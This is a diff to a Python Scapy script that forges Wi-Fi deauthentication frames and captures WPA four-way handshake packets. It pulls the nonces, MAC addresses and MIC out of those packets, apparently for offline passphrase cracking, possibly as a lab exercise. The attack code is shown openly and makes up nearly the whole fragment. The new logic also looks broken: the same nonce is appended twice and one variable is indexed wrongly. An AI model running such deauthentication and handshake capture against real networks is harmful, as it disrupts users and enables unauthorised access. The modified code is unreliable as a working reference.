@@ -56,6 +56,9 @@ if f.mode == 'r':
 # Array to store the Authenticator nonce and the Supplicant nonce
 global nonces
 nonces = []
+
+global pktList
+pktList = []
 # Define the deauthification
 pkt = RadioTap() / Dot11(addr1=sys.argv[2], addr2=sys.argv[3], addr3=sys.argv[3]) / Dot11Deauth(int(7))
 
@@ -71,13 +74,25 @@ ssid = sys.argv[1]
 
 def pkt_callback(pkt):
     if pkt.haslayer(EAPOL):
-        if(pkt.getlayer(Raw).load.hex()[25:26] == '0'):  # We want the messages which replay counter is 0
-            nonces.append(pkt.getlayer(Raw).load.hex()[26:90])
-        if(pkt.getlayer(Raw).load.hex()[:6] == '02030a'): # We check if this is the last handshake packet     
-            APmac = a2b_hex((pkt[Dot11].addr3).replace(":",""))
-            Clientmac = a2b_hex((pkt[Dot11].addr1).replace(":", ""))
-            
-            mic_to_test = pkt.getlayer(Raw).load.hex()[154:-4]
+
+        pktList.append(pkt)
+
+        if(len(pktList) == 4):
+            nonces.append(pktList[0].getlayer(Raw).load.hex()[26:90])
+            nonces.append(pktList[0].getlayer(Raw).load.hex()[26:90])
+
+            APmac = a2b_hex((pktList[0][Dot11].addr3).replace(":",""))
+            Clientmac = a2b_hex((pkt[0][Dot11].addr1).replace(":", ""))
+
+            mic_to_test = pktList[3].getlayer(Raw).load.hex()[154:-4]
+
+        #if(pkt.getlayer(Raw).load.hex()[25:26] == '0'):  # We want the messages which replay counter is 0
+        #    nonces.append(pkt.getlayer(Raw).load.hex()[26:90])
+        #if(pkt.getlayer(Raw).load.hex()[:6] == '02030a'): # We check if this is the last handshake packet     
+        #    APmac = a2b_hex((pkt[Dot11].addr3).replace(":",""))
+        #    Clientmac = a2b_hex((pkt[Dot11].addr1).replace(":", ""))
+        #    
+        #    mic_to_test = pkt.getlayer(Raw).load.hex()[154:-4]
             print("[*] MIC found: " + mic_to_test)
 
             # Important parameters for key derivation - most of them can be obtained from the pcap file
